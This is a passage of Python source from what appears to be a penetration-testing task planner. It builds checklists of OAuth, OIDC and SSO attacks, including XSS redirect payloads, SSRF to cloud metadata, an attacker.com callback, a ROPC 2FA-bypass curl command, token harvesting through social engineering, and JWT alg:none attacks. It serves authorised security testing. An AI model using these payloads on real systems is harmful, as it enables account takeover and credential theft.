                            'Test redirect parameters: base, return_to, RelayState',
                            'Inject XSS: ?base=javascript:alert(document.domain)',
                            'Check if payload reflected and executed',
                            'Mass scan subdomains for same vulnerability'
                        ],
                        'alternatives': [
                            'URL: /oidauth/prompt?base=javascript:alert(1)',
                            'URL: /saml/logout?return_to=javascript:alert(1)',
                            'URL: /sso/logout?RelayState=<script>alert(1)</script>',
                            'Tool: SAMLExtractor to find logout endpoints',
                            'Mass test: Script to test XSS on multiple domains'
                        ],
                        'success_indicators': [
                            'JavaScript executed in browser',
                            'XSS payload reflected without encoding',
                            'Alert box or external script execution',
                            'Multiple subdomains vulnerable (mass impact)'
                        ],
                        'failure_indicators': [
                            'Input sanitized or encoded',
                            'CSP blocks inline JavaScript',
                            'Redirect whitelist enforced',
                            'No reflection of user input'
                        ]
                    }
                }
            ]
        }

    def _create_oidc_attacks_phase(self, target: str, port: int) -> Dict[str, Any]:
        """Create OpenID Connect specific attacks"""
        return {
            'id': f'oidc-attacks-{port}',
            'name': 'OpenID Connect Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'oidc-dynamic-registration-ssrf-{port}',
                    'name': 'Dynamic Client Registration SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test SSRF via OIDC dynamic client registration parameters',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Registration endpoint may fetch URLs in logo_uri, jwks_uri, sector_identifier_uri',
                        'next_steps': [
                            'Find registration endpoint: /.well-known/openid-configuration',
                            'POST to registration_endpoint with malicious URLs',
                            'Test logo_uri: Server fetches logo image',
                            'Test jwks_uri: Server fetches JWK Set',
                            'Test sector_identifier_uri: Server fetches JSON',
                            'Test request_uris: Server may fetch on authorization'
                        ],
                        'alternatives': [
                            'SSRF payload: "logo_uri": "http://169.254.169.254/latest/meta-data/"',
                            'SSRF payload: "jwks_uri": "http://internal-service/secrets"',
                            'SSRF payload: "sector_identifier_uri": "http://localhost:6379/"',
                            'Out-of-band: "logo_uri": "http://attacker.com/callback"',
                            'Internal scan: Test different internal IPs and ports'
                        ],
                        'success_indicators': [
                            'HTTP request to attacker server (OOB)',
                            'Cloud metadata leaked (AWS, Azure, GCP)',
                            'Internal service response visible',
                            'Port scan reveals internal services',
                            'XSS via malicious logo_uri (if rendered)'
                        ],
                        'failure_indicators': [
                            'URL fetching disabled',
                            'Whitelist enforced for URLs',
                            'No outbound requests observed',
                            'SSRF protections in place',
                            'Registration endpoint requires authentication'
                        ],
                        'command': 'curl -X POST https://target/register -H "Content-Type: application/json" -d \'{"logo_uri":"http://169.254.169.254/latest/meta-data/"}\''
                    }
                },
                {
                    'id': f'oidc-mutable-claims-{port}',
                    'name': 'Mutable Claims Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if client relies on mutable claims (email) instead of immutable sub',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'OAuth sub is unique, but email can be changed in some IdPs (e.g., Azure AD)',
                        'next_steps': [
                            '1. Create Azure AD organization (free tenant)',
                            '2. Add user with email victim@gmail.com',
                            '3. Login to target app via "Login with Microsoft"',
                            '4. App creates account based on email claim',
                            '5. Change email in Azure AD to different value',
                            '6. App still identifies user by old email → takeover'
                        ],
                        'alternatives': [
                            'Attack: Target apps relying on email instead of sub',
                            'Attack: Change email in IdP (Azure AD allows this)',
                            'Attack: App associates account with mutable email',
                            'Attack: Email change doesnt update app → confusion',
                            'Test: Check if app uses sub (immutable) or email (mutable)'
                        ],
                        'success_indicators': [
                            'App relies on email claim for user identification',
                            'Email changed in IdP but app uses old association',
                            'Account takeover via email claim manipulation',
                            'sub claim ignored in favor of email'
                        ],
                        'failure_indicators': [
                            'App correctly uses sub claim for identification',
                            'Email changes trigger re-verification',
                            'Proper user identity management',
                            'Immutable identifier enforced'
                        ]
                    }
                },
                {
                    'id': f'oidc-client-confusion-{port}',
                    'name': 'Client Confusion Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if app validates access_token is for correct client_id (Implicit Flow)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Harvest tokens from attackers OAuth app, replay to victim app',
                        'next_steps': [
                            '1. Create public OAuth app (attackers app)',
                            '2. Use Implicit Flow: response_type=token',
                            '3. Trick users into logging into attackers app',
                            '4. Harvest access_tokens from attackers app',
                            '5. Replay tokens to victim app (same IdP)',
                            '6. If victim app doesnt check aud/client_id → takeover'
                        ],
                        'alternatives': [
                            'Setup: Register OAuth app at IdP (Google, Facebook)',
                            'Attack: Social engineering to get users to login',
                            'Harvest: Capture tokens from your apps callback',
                            'Replay: Use tokens with victim apps API/login',
                            'Test: Check if victim validates token.aud == victim_client_id'
                        ],
                        'success_indicators': [
                            'Victim app accepts tokens from different client_id',
                            'No audience validation on access_tokens',
                            'Account takeover with harvested tokens',
                            'Tokens portable across apps (same IdP)'
                        ],
                        'failure_indicators': [
                            'Error: Invalid token or audience',
                            'App validates token belongs to correct client',
                            'aud claim mismatch rejected',
                            'Proper OAuth implementation'
                        ]
                    }
                },
                {
                    'id': f'oidc-scope-upgrade-{port}',
                    'name': 'Scope Upgrade Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if scope parameter in token request can upgrade privileges',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Authorization Server may trust scope in token request without validation',
                        'next_steps': [
                            '1. Complete OAuth flow with minimal scope (e.g., read)',
                            '2. Capture authorization code',
                            '3. Exchange code for token at /token endpoint',
                            '4. Add high-privilege scopes: scope=admin,write,delete',
                            '5. If server doesnt validate → token has upgraded scopes',
                            '6. Use token to perform privileged actions'
                        ],
                        'alternatives': [
                            'Attack: Intercept token exchange request',
                            'Attack: Modify scope parameter to privileged scopes',
                            'Attack: Check if AS validates scope against original auth',
                            'Test: Decode JWT to check actual scopes granted',
                            'Tool: Burp Repeater to modify token request'
                        ],
                        'success_indicators': [
                            'Access token contains upgraded scopes',
                            'Privileged actions succeed with upgraded token',
                            'No scope validation between auth and token requests',
                            'Privilege escalation achieved'
                        ],
                        'failure_indicators': [
                            'Scope limited to originally authorized scopes',
                            'Error: Invalid or unauthorized scope',
                            'AS properly validates scope consistency',
                            'Token scopes match authorization request'
                        ]
                    }
                }
            ]
        }

    def _create_advanced_sso_phase(self, target: str, port: int) -> Dict[str, Any]:
        """Create advanced SSO exploitation tasks"""
        return {
            'id': f'advanced-sso-{port}',
            'name': 'Advanced SSO Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'oauth-ropc-2fa-bypass-{port}',
                    'name': 'OAuth ROPC Flow 2FA Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if Resource Owner Password Credentials flow bypasses 2FA',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'ROPC allows direct username/password auth → may skip 2FA',
                        'next_steps': [
                            'Find ROPC token endpoint (non-standard)',
                            'POST with grant_type=password',
                            'Send username and password directly',
                            'If token returned without 2FA challenge → bypass',
                            'Use token to access protected resources'
                        ],
                        'alternatives': [
                            'POST /oauth/token grant_type=password&username=USER&password=PASS',
                            'Test: Check if 2FA required in ROPC flow',
                            'Attack: Use compromised credentials in ROPC to skip 2FA',
                            'Find ROPC: Check /.well-known/openid-configuration for grant_types',
                            'Reference: CVE-like GitLab ROPC 2FA bypass'
                        ],
                        'success_indicators': [
                            'Access token returned without 2FA challenge',
                            '2FA bypassed via ROPC flow',
                            'Full access with username/password only',
                            'Token has same privileges as interactive login'
                        ],
                        'failure_indicators': [
                            'ROPC flow disabled',
                            '2FA still required for ROPC',
                            'Error: 2FA verification needed',
                            'ROPC not supported by authorization server'
                        ],
                        'command': 'curl -X POST https://target/oauth/token -d "grant_type=password&username=victim&password=pass123&client_id=CLIENT_ID"'
                    }
                },
                {
                    'id': f'redirect-scheme-hijacking-{port}',
                    'name': 'Mobile OAuth Redirect Scheme Hijacking',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if mobile OAuth redirect scheme can be hijacked by malicious app',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Multiple Android apps can register same custom URI scheme',
                        'next_steps': [
                            'Analyze mobile app OAuth flow',
                            'Identify custom URI scheme (e.g., com.example.app://oauth)',
                            'Create malicious app with same intent filter',
                            'Trigger OAuth flow on device with both apps',
                            'Malicious app receives authorization code',
                            'Use code to takeover victims account'
                        ],
                        'alternatives': [
                            'Android: Register intent-filter with same scheme',
                            'Attack: User chooses which app handles redirect (or auto-select)',
                            'Attack: Malicious app captures authorization code',
                            'iOS: More restrictive but still testable',
                            'Tool: Analyze APK to find redirect URI scheme'
                        ],
                        'success_indicators': [
                            'Malicious app receives authorization code',
                            'Multiple apps handle same URI scheme',
                            'No app signature validation',
                            'Account takeover via code theft'
                        ],
                        'failure_indicators': [
                            'App-specific scheme (verified links)',
                            'Signature validation enforced',
                            'iOS Universal Links used (secure)',
                            'PKCE prevents code reuse'
                        ]
                    }
                },
                {
                    'id': f'oauth-race-condition-{port}',
                    'name': 'OAuth Provider Race Conditions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for race conditions in OAuth token/code handling',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Race conditions may allow code reuse or multiple token grants',
                        'next_steps': [
                            'Capture valid authorization code',
                            'Send multiple simultaneous token exchange requests',
                            'Check if code can be reused (should be one-time use)',
                            'Test account linking race conditions',
                            'Test parallel OAuth flows for same user'
                        ],
                        'alternatives': [
                            'Tool: Burp Repeater → Send to Intruder → Null payload',
                            'Tool: Turbo Intruder for precise timing',
                            'Test: Reuse authorization code multiple times',
                            'Test: Link multiple accounts simultaneously',
                            'Attack: Parallel requests exploit timing window'
                        ],
                        'success_indicators': [
                            'Authorization code reused multiple times',
                            'Multiple access tokens from same code',
                            'Race condition in account linking',
                            'Time-of-check/time-of-use vulnerability'
                        ],
                        'failure_indicators': [
                            'Code invalidated after first use',
                            'Proper synchronization and locking',
                            'Error: Code already used',
                            'Race condition protections in place'
                        ]
                    }
                },
                {
                    'id': f'oauth-open-redirect-referrer-{port}',
                    'name': 'Open Redirect + Referrer Code Leakage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Chain open redirect on callback page with Referer leakage to steal code',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Open redirect based on Referer header can leak authorization code',
                        'next_steps': [
                            '1. Victim visits attackers website',
                            '2. Attacker initiates OAuth with response_type=id_token,code&prompt=none',
                            '3. Referer set to attackers domain',
                            '4. OAuth callback redirects to victims site',
                            '5. Callback page has open redirect based on Referer',
                            '6. User redirected to attacker with code in URL fragment',
                            '7. Attacker captures code from fragment → takeover'
                        ],
                        'alternatives': [
                            'Attack: Requires open redirect on callback page',
                            'Attack: Redirect based on Referer header',
                            'Attack: Use response_type=id_token,code for fragment',
                            'Attack: prompt=none for silent flow',
                            'Setup: Host HTML on attacker domain to control Referer'
                        ],
                        'success_indicators': [
                            'Authorization code leaked via Referer redirect',
                            'Code visible in attackers logs',
                            'Open redirect chains with OAuth flow',
                            'Account takeover via stolen code'
                        ],
                        'failure_indicators': [
                            'No open redirect on callback page',
                            'Referer header not used for redirects',
                            'Code not in fragment (different response_type)',
                            'Proper redirect validation'
                        ]
                    }
                },
                {
                    'id': f'oauth-jwt-manipulation-{port}',
                    'name': 'OAuth JWT Token Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test JWT access tokens for signature bypass and claim manipulation',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'If access_token is JWT, test for JWT vulnerabilities',
                        'next_steps': [
                            'Decode access_token at jwt.io',
                            'Test alg:none attack (remove signature)',
                            'Test algorithm confusion (RS256 → HS256)',
                            'Modify claims: sub, email, role, scope',
                            'Test weak signing keys',
                            'Re-sign with cracked key or bypass signature'
                        ],
                        'alternatives': [
                            'Tool: jwt_tool for automated JWT attacks',
                            'Attack: Change alg to "none" and remove signature',
                            'Attack: Change RS256 to HS256, sign with public key',
                            'Attack: Modify sub claim to victim user ID',
                            'Attack: Add admin scopes or roles',
                            'Crack: john/hashcat on HS256 signature'
                        ],
                        'success_indicators': [
                            'JWT accepted with alg:none',
                            'Algorithm confusion successful',
                            'Modified claims accepted',
                            'Privilege escalation via claim manipulation',
                            'Weak key cracked'
                        ],
                        'failure_indicators': [
                            'Signature validation enforced',
                            'Algorithm whitelist enforced',
                            'Strong signing key',
                            'Claims validated against source of truth',
                            'Proper JWT implementation'
                        ],
                        'command': 'python3 jwt_tool.py ACCESS_TOKEN -X a'
                    }
                }
            ]
        }
